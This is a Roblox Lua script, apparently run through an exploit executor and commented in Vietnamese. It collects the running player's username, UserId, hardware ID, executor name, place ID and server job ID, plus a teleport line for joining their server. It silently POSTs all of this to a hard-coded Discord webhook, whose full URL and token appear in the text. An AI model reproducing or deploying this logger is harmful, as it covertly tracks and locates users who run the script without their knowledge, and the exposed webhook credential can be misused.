local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local executor = identifyexecutor()
local placeId = game.PlaceId
local jobId = game.JobId

-- Tạo dữ liệu gửi lên Discord
local Data = {
    ["embeds"] = {
        {
            ["title"] = "Thông Tin Tài Khoản Roblox",
            ["url"] = "https://www.roblox.com/users/"..player.UserId,
            ["description"] = "Tên hiển thị: **"..player.DisplayName.."**",
            ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"},
            ["fields"] = {
                {
                    ["name"] = "Tên người dùng:",
                    ["value"] = "`"..player.Name.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID:",
                    ["value"] = "`"..player.UserId.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = "`"..executor.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID:",
                    ["value"] = "`"..hwid.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Place ID:",
                    ["value"] = "`"..placeId.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Job ID:",
                    ["value"] = "`"..jobId.."`",
                    ["inline"] = true
                },
                {
                    ["name"] = "Script Hop:",
                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\", game.Players.LocalPlayer)```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Thank You Everyone",
                    ["value"] = "Used Script By Yuongzmin✅",
                    ["inline"] = false
                }
            }
        }
    }
}

local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)

local WebhookURL = "https://discord.com/api/webhooks/1368280272520609913/MMIdIi6ABJiRMhIWIUgt9JpE1Lsylg3QJ2wYVHJ11jdi-vBMxZ60atRjoQ5R2jPqCBgp"
local Request = http_request or request or HttpPost or syn.request
if Request then
    Request({Url = WebhookURL, Body = Encoded, Method = "POST", Headers = Headers})
end
